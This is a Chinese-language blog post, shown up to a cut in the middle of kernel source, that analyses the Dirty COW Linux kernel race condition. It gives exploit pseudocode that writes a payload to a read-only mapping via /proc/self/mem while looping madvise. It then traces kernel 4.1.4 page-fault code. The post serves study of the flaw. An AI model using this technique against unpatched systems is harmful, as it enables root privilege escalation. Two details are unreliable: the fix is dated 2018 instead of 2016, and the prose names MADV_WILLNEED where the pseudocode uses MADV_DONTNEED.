<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 5.4.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta name="description" content="Dirty Cow 漏洞成因 Dirty COW 漏洞是一种发生在写时复制 Copy-On-Write 的条件竞争漏洞  自2007年9月 linux kernel-2.6.22 被引入，直到2018年 linux kernel 4.8.3, 4.7.9, 4.4.26 之后才被彻底修复  写时复制：  使用 fork 系统调用创建子进程，那么这个子进程通过使页表条目指向相同的物理内存来共享父进程">
<meta property="og:type" content="article">
<meta property="og:title" content="Kernel 现实漏洞复现：Dirty Cow">
<meta property="og:url" content="http://example.com/2022/11/22/Kernel%20%E7%8E%B0%E5%AE%9E%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%9ADirty%20Cow/index.html">
<meta property="og:site_name" content="Pwn进你的心">
<meta property="og:description" content="Dirty Cow 漏洞成因 Dirty COW 漏洞是一种发生在写时复制 Copy-On-Write 的条件竞争漏洞  自2007年9月 linux kernel-2.6.22 被引入，直到2018年 linux kernel 4.8.3, 4.7.9, 4.4.26 之后才被彻底修复  写时复制：  使用 fork 系统调用创建子进程，那么这个子进程通过使页表条目指向相同的物理内存来共享父进程">
<meta property="og:locale" content="en_US">
<meta property="article:published_time" content="2022-11-22T11:05:20.000Z">
<meta property="article:modified_time" content="2024-02-25T17:45:16.036Z">
<meta property="article:author" content="yhellow">
<meta property="article:tag" content="Kernel">
<meta property="article:tag" content="DirtyCow">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="http://example.com/2022/11/22/Kernel%20%E7%8E%B0%E5%AE%9E%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%9ADirty%20Cow/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : false,
    isPost : true,
    lang   : 'en'
  };
</script>

  <title>Kernel 现实漏洞复现：Dirty Cow | Pwn进你的心</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">Pwn进你的心</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content post posts-expand">
            

    
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/11/22/Kernel%20%E7%8E%B0%E5%AE%9E%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%9ADirty%20Cow/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          Kernel 现实漏洞复现：Dirty Cow
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-11-22 19:05:20" itemprop="dateCreated datePublished" datetime="2022-11-22T19:05:20+08:00">2022-11-22</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2024-02-26 01:45:16" itemprop="dateModified" datetime="2024-02-26T01:45:16+08:00">2024-02-26</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/CVE/" itemprop="url" rel="index"><span itemprop="name">CVE</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Views" id="busuanzi_container_page_pv" style="display: none;">
              <span class="post-meta-item-icon">
                <i class="eye"></i>
              </span>
              <span class="post-meta-item-text">Views: </span>
              <span id="busuanzi_value_page_pv"></span>
            </span>
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>18k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>17 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
        <p><strong>Dirty Cow 漏洞成因</strong></p>
<p>Dirty COW 漏洞是一种发生在写时复制 Copy-On-Write 的条件竞争漏洞</p>
<ul>
<li>自2007年9月 <code>linux kernel-2.6.22</code> 被引入，直到2018年 <code>linux kernel 4.8.3, 4.7.9, 4.4.26</code> 之后才被彻底修复</li>
</ul>
<p>写时复制：</p>
<ul>
<li>使用 <code>fork</code> 系统调用创建子进程，那么这个子进程通过使页表条目指向相同的物理内存来共享父进程内存</li>
<li>当任何进程试图写入内存时，会引发异常，OS 将为子进程分配新的物理内存，从父进程复制内容，更改每个进程的页表使它指向自己的私有内存副本</li>
<li>其基本原理为：修改父页面为不可写（不管之前是什么权限），当程序尝试往该页中写入数据时，程序就会触发页中断，然后根据标志位来判断页中断原因为 COW，之后就调用对应的函数来分配 COW 页，并建立 COW 页表项</li>
</ul>
<p>条件竞争：</p>
<ul>
<li>一个系统或者进程的输出，依赖于不受控制的事件出现顺序，或者出现时机</li>
<li>在多个进程（线程）同时访问和操作相同的数据时，访问的顺序可能与预期有差别，这将造成较为严重的安全问题</li>
</ul>
<p>COW 执行过程执行三个重要步骤：</p>
<ul>
<li>制作映射内存的副本</li>
<li>更新页表，使虚拟内存指向新创建的物理地址</li>
<li>写入内存</li>
</ul>
<p>由于三个步骤不是原子性的，一个线程在执行这三个步骤过程中可能被其他线程中断，从而产生潜在的竞态条件</p>
<p><strong>Dirty Cow 漏洞利用</strong></p>
<p>Dirty Cow 的利用需要两个系统调用：</p>
<ul>
<li><code>mmap</code>：将一个文件或者其它对象映射到进程的地址空间</li>
<li><code>madvise</code>：建议内核如何使用指定段的内存（当参数设置为 <code>MADV_WILLNEED</code> 时，内核将释放掉这一块内存以节省空间，相应的页表项也会被置空）</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/dirtycow/dirtycow.github.io</span><br></pre></td></tr></table></figure>
<p>伪代码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">Main:</span><br><span class="line">    fd = open(filename, O_RDONLY)</span><br><span class="line">    fstat(fd, &amp;st)</span><br><span class="line">    <span class="built_in">map</span> = mmap(<span class="literal">NULL</span>, st.st_size , PROT_READ, MAP_PRIVATE, fd, <span class="number">0</span>) </span><br><span class="line">    start Thread1</span><br><span class="line">    start Thread2</span><br><span class="line">    </span><br><span class="line">Thread1：</span><br><span class="line">    f = open(<span class="string">&quot;/proc/self/mem&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>):</span><br><span class="line">        lseek(f, <span class="built_in">map</span>, SEEK_SET);</span><br><span class="line">        write(f, shellcode, <span class="built_in">strlen</span>(shellcode));</span><br><span class="line">        </span><br><span class="line">Thread2：</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>):</span><br><span class="line">        madvise(<span class="built_in">map</span>, <span class="number">100</span>, MADV_DONTNEED);</span><br></pre></td></tr></table></figure>
<ul>
<li>主线程打开目标文件，并且把该文件映射到内存（非匿名映射）</li>
<li>Thread1 循环向写入 <code>map</code> 中写入数据</li>
<li>Thread2 循环对 <code>map</code> 解除映射</li>
</ul>
<p>接下来就详细分析一下这个过程：（内核版本为：4.1.4）</p>
<p>用户态 <code>mmap</code> 在内核中对应的函数为 <code>sys_mmap</code>，其核心函数为 <code>do_mmap_pgoff</code>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="title">do_mmap_pgoff</span><span class="params">(struct file *file, <span class="keyword">unsigned</span> <span class="keyword">long</span> addr,</span></span></span><br><span class="line"><span class="params"><span class="function">			<span class="keyword">unsigned</span> <span class="keyword">long</span> len, <span class="keyword">unsigned</span> <span class="keyword">long</span> prot,</span></span></span><br><span class="line"><span class="params"><span class="function">			<span class="keyword">unsigned</span> <span class="keyword">long</span> flags, <span class="keyword">unsigned</span> <span class="keyword">long</span> pgoff,</span></span></span><br><span class="line"><span class="params"><span class="function">			<span class="keyword">unsigned</span> <span class="keyword">long</span> *populate)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">mm_struct</span> *<span class="title">mm</span> =</span> current-&gt;mm;</span><br><span class="line">	<span class="keyword">vm_flags_t</span> vm_flags;</span><br><span class="line"></span><br><span class="line">	*populate = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Does the application expect PROT_READ to imply PROT_EXEC?</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * (the exception is when the underlying filesystem is noexec</span></span><br><span class="line"><span class="comment">	 *  mounted, in which case we dont add PROT_EXEC.)</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">if</span> ((prot &amp; PROT_READ) &amp;&amp; (current-&gt;personality &amp; READ_IMPLIES_EXEC))</span><br><span class="line">		<span class="keyword">if</span> (!(file &amp;&amp; (file-&gt;f_path.mnt-&gt;mnt_flags &amp; MNT_NOEXEC)))</span><br><span class="line">			prot |= PROT_EXEC;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!len)</span><br><span class="line">		<span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!(flags &amp; MAP_FIXED))</span><br><span class="line">		addr = round_hint_to_min(addr);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Careful about overflows.. */</span></span><br><span class="line">	len = PAGE_ALIGN(len);</span><br><span class="line">	<span class="keyword">if</span> (!len)</span><br><span class="line">		<span class="keyword">return</span> -ENOMEM;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* offset overflow? */</span></span><br><span class="line">	<span class="keyword">if</span> ((pgoff + (len &gt;&gt; PAGE_SHIFT)) &lt; pgoff)</span><br><span class="line">		<span class="keyword">return</span> -EOVERFLOW;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Too many mappings? */</span></span><br><span class="line">	<span class="keyword">if</span> (mm-&gt;map_count &gt; sysctl_max_map_count)</span><br><span class="line">		<span class="keyword">return</span> -ENOMEM;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Obtain the address to map to. we verify (or select) it and ensure</span></span><br><span class="line"><span class="comment">	 * that it represents a valid section of the address space.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	addr = get_unmapped_area(file, addr, len, pgoff, flags); <span class="comment">/* 获取一段当前进程未被使用的虚拟地址空间,并返回其起始地址 */</span></span><br><span class="line">	<span class="keyword">if</span> (addr &amp; ~PAGE_MASK)</span><br><span class="line">		<span class="keyword">return</span> addr;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Do simple checking here so the lower-level routines won&#x27;t have</span></span><br><span class="line"><span class="comment">	 * to. we assume access permissions have been handled by the open</span></span><br><span class="line"><span class="comment">	 * of the memory object, so we don&#x27;t do any here.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	vm_flags = calc_vm_prot_bits(prot) | calc_vm_flag_bits(flags) |</span><br><span class="line">			mm-&gt;def_flags | VM_MAYREAD | VM_MAYWRITE | VM_MAYEXEC;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (flags &amp; MAP_LOCKED)</span><br><span class="line">		<span class="keyword">if</span> (!can_do_mlock())</span><br><span class="line">			<span class="keyword">return</span> -EPERM;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (mlock_future_check(mm, vm_flags, len))</span><br><span class="line">		<span class="keyword">return</span> -EAGAIN;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (file) &#123;</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">inode</span> *<span class="title">inode</span> =</span> file_inode(file);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">switch</span> (flags &amp; MAP_TYPE) &#123;</span><br><span class="line">		<span class="keyword">case</span> MAP_SHARED: <span class="comment">/* 共享映射 */</span></span><br><span class="line">			<span class="keyword">if</span> ((prot&amp;PROT_WRITE) &amp;&amp; !(file-&gt;f_mode&amp;FMODE_WRITE))</span><br><span class="line">				<span class="keyword">return</span> -EACCES;</span><br><span class="line"></span><br><span class="line">			<span class="comment">/*</span></span><br><span class="line"><span class="comment">			 * Make sure we don&#x27;t allow writing to an append-only</span></span><br><span class="line"><span class="comment">			 * file..</span></span><br><span class="line"><span class="comment">			 */</span></span><br><span class="line">			<span class="keyword">if</span> (IS_APPEND(inode) &amp;&amp; (file-&gt;f_mode &amp; FMODE_WRITE))</span><br><span class="line">				<span class="keyword">return</span> -EACCES;</span><br><span class="line"></span><br><span class="line">			<span class="comment">/*</span></span><br><span class="line"><span class="comment">			 * Make sure there are no mandatory locks on the file.</span></span><br><span class="line"><span class="comment">			 */</span></span><br><span class="line">			<span class="keyword">if</span> (locks_verify_locked(file))</span><br><span class="line">				<span class="keyword">return</span> -EAGAIN;</span><br><span class="line"></span><br><span class="line">			vm_flags |= VM_SHARED | VM_MAYSHARE;</span><br><span class="line">			<span class="keyword">if</span> (!(file-&gt;f_mode &amp; FMODE_WRITE))</span><br><span class="line">				vm_flags &amp;= ~(VM_MAYWRITE | VM_SHARED);</span><br><span class="line"></span><br><span class="line">			<span class="comment">/* fall through */</span></span><br><span class="line">		<span class="keyword">case</span> MAP_PRIVATE: <span class="comment">/* 私有内存 */</span></span><br><span class="line">			<span class="keyword">if</span> (!(file-&gt;f_mode &amp; FMODE_READ))</span><br><span class="line">				<span class="keyword">return</span> -EACCES;</span><br><span class="line">			<span class="keyword">if</span> (file-&gt;f_path.mnt-&gt;mnt_flags &amp; MNT_NOEXEC) &#123;</span><br><span class="line">				<span class="keyword">if</span> (vm_flags &amp; VM_EXEC)</span><br><span class="line">					<span class="keyword">return</span> -EPERM;</span><br><span class="line">				vm_flags &amp;= ~VM_MAYEXEC;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> (!file-&gt;f_op-&gt;mmap)</span><br><span class="line">				<span class="keyword">return</span> -ENODEV;</span><br><span class="line">			<span class="keyword">if</span> (vm_flags &amp; (VM_GROWSDOWN|VM_GROWSUP))</span><br><span class="line">				<span class="keyword">return</span> -EINVAL;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">default</span>:</span><br><span class="line">			<span class="keyword">return</span> -EINVAL;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="keyword">switch</span> (flags &amp; MAP_TYPE) &#123;</span><br><span class="line">		<span class="keyword">case</span> MAP_SHARED:</span><br><span class="line">			<span class="keyword">if</span> (vm_flags &amp; (VM_GROWSDOWN|VM_GROWSUP))</span><br><span class="line">				<span class="keyword">return</span> -EINVAL;</span><br><span class="line">			<span class="comment">/*</span></span><br><span class="line"><span class="comment">			 * Ignore pgoff.</span></span><br><span class="line"><span class="comment">			 */</span></span><br><span class="line">			pgoff = <span class="number">0</span>;</span><br><span class="line">			vm_flags |= VM_SHARED | VM_MAYSHARE;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> MAP_PRIVATE:</span><br><span class="line">			<span class="comment">/*</span></span><br><span class="line"><span class="comment">			 * Set pgoff according to addr for anon_vma.</span></span><br><span class="line"><span class="comment">			 */</span></span><br><span class="line">			pgoff = addr &gt;&gt; PAGE_SHIFT;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">default</span>:</span><br><span class="line">			<span class="keyword">return</span> -EINVAL;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Set &#x27;VM_NORESERVE&#x27; if we should not account for the</span></span><br><span class="line"><span class="comment">	 * memory use of this mapping.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">if</span> (flags &amp; MAP_NORESERVE) &#123;</span><br><span class="line">		<span class="comment">/* We honor MAP_NORESERVE if allowed to overcommit */</span></span><br><span class="line">		<span class="keyword">if</span> (sysctl_overcommit_memory != OVERCOMMIT_NEVER)</span><br><span class="line">			vm_flags |= VM_NORESERVE;</span><br><span class="line"></span><br><span class="line">		<span class="comment">/* hugetlb applies strict overcommit unless MAP_NORESERVE */</span></span><br><span class="line">		<span class="keyword">if</span> (file &amp;&amp; is_file_hugepages(file))</span><br><span class="line">			vm_flags |= VM_NORESERVE;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	addr = mmap_region(file, addr, len, vm_flags, pgoff); <span class="comment">/* 完成映射过程 */</span></span><br><span class="line">	<span class="keyword">if</span> (!IS_ERR_VALUE(addr) &amp;&amp;</span><br><span class="line">	    ((vm_flags &amp; VM_LOCKED) ||</span><br><span class="line">	     (flags &amp; (MAP_POPULATE | MAP_NONBLOCK)) == MAP_POPULATE))</span><br><span class="line">		*populate = len;</span><br><span class="line">	<span class="keyword">return</span> addr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>前面就是根据 <code>flags</code> 中的标志位进行一些设置</li>
<li>后面进入 <code>mmap_region</code> 函数完成映射</li>
<li>值得注意的一点是：如果没有设置 <code>flag=MAP_POPULATE</code>（提前建立页表的标志位），是不会建立页表项的</li>
<li>也就是说，当后续的 <code>write</code> 读取该 VMA 对应的地址空间时，会触发缺页异常 <code>page_fault</code></li>
</ul>
<p><code>page_fault</code> 可能有多种原因：</p>
<ul>
<li>访问地址不在虚拟地址空间</li>
<li>访问地址在虚拟地址空间中，但没有访问权限</li>
<li>访问地址在虚拟地址空间中，但没有与物理地址间建立映射关系</li>
</ul>
<p>Linux 内核关于 <code>page_fault</code> 的处理是通过一系列系统调用函数实现的：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">do_page_fault() -&gt; handle_mm_fault() -&gt; handle_pte_fault() -&gt; do_fault()</span><br></pre></td></tr></table></figure>
<ul>
<li><code>do_page_fault</code>：会检查多种异常原因，比如缺页异常的地址在内核空间还是用户空间，是内核态还是用户态触发的异常等等情况</li>
<li><code>handle_mm_fault</code>：为发生 <code>page_fault</code> 的地址分配各级页表目录</li>
<li><code>handle_pte_fault</code>：从上层函数得到了缺页异常的 <code>pte</code>（页表项），然后做多层检查</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">handle_pte_fault</span><span class="params">(struct mm_struct *mm,</span></span></span><br><span class="line"><span class="params"><span class="function">		     struct vm_area_struct *vma, <span class="keyword">unsigned</span> <span class="keyword">long</span> address,</span></span></span><br><span class="line"><span class="params"><span class="function">		     <span class="keyword">pte_t</span> *pte, <span class="keyword">pmd_t</span> *pmd, <span class="keyword">unsigned</span> <span class="keyword">int</span> flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">pte_t</span> entry;</span><br><span class="line">	<span class="keyword">spinlock_t</span> *ptl;</span><br><span class="line">	entry = *pte;</span><br><span class="line">	barrier();</span><br><span class="line">	<span class="keyword">if</span> (!pte_present(entry)) &#123; <span class="comment">/* pte所指向的物理地址不存在 */</span></span><br><span class="line">		<span class="keyword">if</span> (pte_none(entry)) &#123; <span class="comment">/* pte中内容为空,表示进程第一次访问该页 */</span></span><br><span class="line">			<span class="keyword">if</span> (vma-&gt;vm_ops)</span><br><span class="line">				<span class="keyword">return</span> do_fault(mm, vma, address, pte, pmd,</span><br><span class="line">						flags, entry); <span class="comment">/* 非匿名区域,分配物理页框 */</span></span><br><span class="line"></span><br><span class="line">			<span class="keyword">return</span> do_anonymous_page(mm, vma, address, pte, pmd,</span><br><span class="line">					flags); <span class="comment">/* vma为匿名区域,分配物理页框,初始化为全&#x27;0&#x27; */</span></span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> do_swap_page(mm, vma, address,</span><br><span class="line">					pte, pmd, flags, entry); <span class="comment">/* 说明该页之前存在于主存中,但是被Swap机制换出了,于是再次换回即可 */</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (pte_protnone(entry)) <span class="comment">/* pte所指向的物理地址存在,即该页在物理内存中 */</span></span><br><span class="line">		<span class="keyword">return</span> do_numa_page(mm, vma, address, entry, pte, pmd);</span><br><span class="line"></span><br><span class="line">	ptl = pte_lockptr(mm, pmd);</span><br><span class="line">	spin_lock(ptl);</span><br><span class="line">	<span class="keyword">if</span> (unlikely(!pte_same(*pte, entry)))</span><br><span class="line">		<span class="keyword">goto</span> unlock;</span><br><span class="line">	<span class="keyword">if</span> (flags &amp; FAULT_FLAG_WRITE) &#123;</span><br><span class="line">		<span class="keyword">if</span> (!pte_write(entry)) <span class="comment">/* 对应的页不可写 */</span></span><br><span class="line">			<span class="keyword">return</span> do_wp_page(mm, vma, address,</span><br><span class="line">					pte, pmd, ptl, entry); <span class="comment">/* 进行写时复制,将内容写到副本页面上 */</span></span><br><span class="line">		entry = pte_mkdirty(entry); <span class="comment">/* 